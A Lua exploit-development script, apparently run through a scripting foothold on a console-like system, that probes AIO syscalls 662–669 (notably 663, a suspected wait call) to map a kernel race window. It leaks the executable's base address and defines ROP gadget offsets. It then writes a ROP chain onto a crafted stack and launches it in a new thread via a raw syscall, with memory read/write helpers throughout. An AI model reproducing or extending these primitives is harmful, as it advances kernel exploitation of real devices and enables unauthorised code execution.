-- CRASH_CLASS: MODERATE
-- PROBE 71h: What does 663 (aio_multi_wait?) actually DO?
--
-- From docs: 663 takes (ids, count, states) like 662, returns 0.
-- But we don't know if 663 BLOCKS on pending I/O.
-- If it does, it inserts a waiter into Q+0x50 — creating a different
-- race window than 662-vs-662.
--
-- Tests:
--   [A] 663 on completed+polled request (should return instantly)
--   [B] 663 on completed+unpolled request (returns or blocks?)
--   [C] 663 on pending request via socketpair (blocks? timeout?)
--   [D] 663 output comparison vs 662/666 (same status format?)
--   [E] 662-vs-663 race on polled request (different from 662-vs-662?)

print("=== PROBE 71h: 663 BEHAVIOR ANALYSIS ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(N(info))) end)
local EB = (rd(info + 0x10C) or 0) * 0x100000000 + (rd(info + 0x108) or 0)
print("eboot=" .. string.format("0x%X", EB))

local stub = syscall.pipe.fn_addr
local pid = N(mk(20)())
print("pid=" .. pid)

local g_pop_rax = uint64(EB + 0x992)
local g_pop_rdi = uint64(EB + 0xC9DFE)
local g_pop_rsi = uint64(EB + 0xD77D)
local g_pop_rdx = uint64(EB + 0x3B02D7)
local g_pop_rcx = uint64(EB + 0xE64)
local g_bare_ret = uint64(EB + 0x42)
local g_mov_m_rax = uint64(EB + 0x92C67)

-- Open /dev/zero for instant-complete requests
local zero_path = memory.alloc(16)
for c = 1, 9 do pcall(function() memory.write_byte(zero_path + c - 1, string.byte("/dev/zero", c)) end) end
pcall(function() memory.write_byte(zero_path + 9, 0) end)
local ok, zfd_v = pcall(function() return mk(5)(uint64(N(zero_path)), uint64(0)) end)
local zfd = N(zfd_v)
print("zero_fd=" .. zfd)

-- Create socketpair for pending (blocking) requests
local spfds = memory.alloc(16)
local ok_sp, rv_sp = pcall(function()
    return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spfds)))
end)
local sp0 = rd(spfds)
local sp1 = rd(spfds + 4)
print(string.format("socketpair: rv=%s fd0=%d fd1=%d", tostring(N(rv_sp)), sp0 or -1, sp1 or -1))

local data_buf = memory.alloc(256)
local result_buf = memory.alloc(8)

local function aio_submit(fd)
    local req = memory.alloc(0x28)
    wq(req + 0x00, uint64(0))
    wq(req + 0x08, uint64(16))
    wq(req + 0x10, uint64(N(data_buf)))
    wq(req + 0x18, uint64(N(result_buf)))
    wq(req + 0x20, uint64(fd))
    local ib = memory.alloc(8); wd(ib, 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(ib)))
    end)
    return rd(ib) or 0
end

local function aio_poll(aid)
    local ib = memory.alloc(8); wd(ib, aid)
    local sb = memory.alloc(8); wd(sb, 0xDEAD)
    pcall(function() mk(664)(uint64(N(ib)), uint64(1), uint64(N(sb))) end)
    return rd(sb)
end

local function aio_delete(aid)
    local ib = memory.alloc(8); wd(ib, aid)
    local sb = memory.alloc(8); wd(sb, 0xDEAD)
    pcall(function() mk(662)(uint64(N(ib)), uint64(1), uint64(N(sb))) end)
    return rd(sb)
end

local function aio_status(aid)
    local ib = memory.alloc(8); wd(ib, aid)
    local sb = memory.alloc(8); wd(sb, 0xDEAD)
    pcall(function() mk(666)(uint64(N(ib)), uint64(1), uint64(N(sb))) end)
    return rd(sb)
end

local function aio_663(aid)
    local ib = memory.alloc(8); wd(ib, aid)
    local sb = memory.alloc(8); wd(sb, 0xDEAD)
    pcall(function() mk(663)(uint64(N(ib)), uint64(1), uint64(N(sb))) end)
    return rd(sb)
end

print("")

-- ============================================================
-- [A] 663 on completed+polled request (instant complete via /dev/zero)
-- ============================================================
print("[A] 663 on completed+polled request")
local id_a = aio_submit(zfd)
aio_poll(id_a)
local st_a_666 = aio_status(id_a)
local st_a_663 = aio_663(id_a)
print(string.format("  id=0x%X  666=0x%08X  663=0x%08X", id_a, st_a_666 or 0, st_a_663 or 0))
local st_a_after = aio_status(id_a)
print(string.format("  666_after_663=0x%08X", st_a_after or 0))

-- Did 663 consume/delete the request?
local del_a = aio_delete(id_a)
print(string.format("  662_delete=0x%08X", del_a or 0))
print("")

-- ============================================================
-- [B] 663 on completed+UNPOLLED request
-- ============================================================
print("[B] 663 on completed+unpolled request")
local id_b = aio_submit(zfd)
-- DON'T poll — request completed in kernel but user hasn't acknowledged
local st_b_666 = aio_status(id_b)
print(string.format("  id=0x%X  666_before=0x%08X (unpolled)", id_b, st_b_666 or 0))

local st_b_663 = aio_663(id_b)
print(string.format("  663=0x%08X (returned, didn't block)", st_b_663 or 0))

local st_b_after = aio_status(id_b)
print(string.format("  666_after=0x%08X", st_b_after or 0))

-- Can we poll + delete normally after 663?
aio_poll(id_b)
local del_b = aio_delete(id_b)
print(string.format("  poll+delete=0x%08X", del_b or 0))
print("")

-- ============================================================
-- [C] 663 on PENDING request (socketpair read, no data sent)
-- ============================================================
print("[C] 663 on PENDING request (socketpair, child thread)")
print("  Submitting AIO read on socketpair (no data → should pend)")

-- Submit read on sp0 (nothing written to sp1 yet)
local id_c = aio_submit(sp0 or 0)
local st_c_666 = aio_status(id_c)
print(string.format("  id=0x%X  666=0x%08X", id_c, st_c_666 or 0))

-- Call 663 from a child thread (might block!)
-- Use a timeout: if child doesn't finish in ~500ms, it blocked
local marker_c = memory.alloc(8); wq(marker_c, uint64(0))

local stk_c = memory.alloc(0x4000)
local sb_c = N(stk_c)
local rsp_c = sb_c + 0x2000 - ((sb_c + 0x2000) % 16) - 8
for i = 0, 0x1FFC, 4 do wd(sb_c + i, 0) end
local oc = 0
local function emc(v) wq(rsp_c + oc, v); oc = oc + 8 end

-- 663(ids, 1, states) via ROP
local ids_c = memory.alloc(8); wd(ids_c, id_c)
local sts_c = memory.alloc(8); wd(sts_c, 0xDEAD)

emc(g_pop_rdi); emc(uint64(N(ids_c)))
emc(g_pop_rsi); emc(uint64(1))
emc(g_pop_rdx); emc(uint64(N(sts_c)))
emc(g_pop_rax); emc(uint64(663))
emc(stub)
emc(g_pop_rax); emc(uint64(0xC663))
emc(g_pop_rdi); emc(uint64(N(marker_c)))
emc(g_mov_m_rax)
emc(g_pop_rdi); emc(uint64(0))
emc(g_pop_rax); emc(uint64(431))
emc(stub)

local par_c = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(par_c) + i, 0) end
wq(N(par_c), g_bare_ret)
wq(N(par_c) + 0x10, uint64(sb_c))
wq(N(par_c) + 0x18, uint64(0x2000))
local tid_c = memory.alloc(8); wq(N(tid_c), uint64(0))
wq(N(par_c) + 0x30, tid_c)

pcall(function() mk(455)(par_c, uint64(0x38)) end)

-- Short wait — if 663 blocks, marker stays 0
for w = 1, 200000 do local _ = rd(sb_c) end

local mk_c = rd(marker_c)
local sts_c_val = rd(sts_c)
print(string.format("  marker=0x%X  sts=0x%08X", mk_c or 0, sts_c_val or 0))

if mk_c == 0xC663 then
    print("  663 RETURNED (did NOT block on pending request)")
else
    print("  663 is BLOCKING or child didn't finish")
    print("  Sending data to unblock...")
    -- Write to sp1 to complete the AIO read
    local send_buf = memory.alloc(16)
    wq(N(send_buf), uint64(0x4141414141414141))
    pcall(function() mk(4)(uint64(sp1 or 0), uint64(N(send_buf)), uint64(8)) end)
    -- Wait more
    for w = 1, 300000 do local _ = rd(sb_c) end
    mk_c = rd(marker_c)
    sts_c_val = rd(sts_c)
    print(string.format("  after_data: marker=0x%X sts=0x%08X", mk_c or 0, sts_c_val or 0))
    if mk_c == 0xC663 then
        print("  *** 663 BLOCKED then UNBLOCKED on data arrival! ***")
        print("  *** 663 IS a WAIT call — blocking race is possible! ***")
    else
        print("  Still blocked or crashed")
    end
end
print("")

-- ============================================================
-- [D] 663 vs 666 output comparison
-- ============================================================
print("[D] 663 vs 666 output comparison")
for i = 1, 3 do
    local tid = aio_submit(zfd)
    aio_poll(tid)
    local s666 = aio_status(tid)
    local s663 = aio_663(tid)
    print(string.format("  id=0x%X  666=0x%08X  663=0x%08X  %s",
        tid, s666 or 0, s663 or 0,
        (s666 == s663) and "SAME" or "DIFFERENT"))
    aio_delete(tid)
end
print("")

-- ============================================================
-- [E] Does 663 work on UNPOLLED completed without blocking?
-- Verify section B wasn't just fast
-- ============================================================
print("[E] 663 on 4 unpolled completed requests (consistency)")
for i = 1, 4 do
    local tid = aio_submit(zfd)
    local s = aio_663(tid)
    print(string.format("  id=0x%X  663=0x%08X", tid, s or 0))
    aio_poll(tid)
    aio_delete(tid)
end
print("")

-- ============================================================
-- [F] 663 after 662 delete (on dead ID)
-- ============================================================
print("[F] 663 on deleted ID")
local id_f = aio_submit(zfd)
aio_poll(id_f)
aio_delete(id_f)
local s_dead = aio_663(id_f)
print(string.format("  id=0x%X  663_after_delete=0x%08X", id_f, s_dead or 0))
print("")

-- Cleanup
if sp0 and sp0 > 0 then pcall(function() mk(6)(uint64(sp0)) end) end
if sp1 and sp1 > 0 then pcall(function() mk(6)(uint64(sp1)) end) end

print("alive=YES")
print("=== PROBE 71h COMPLETE ===")
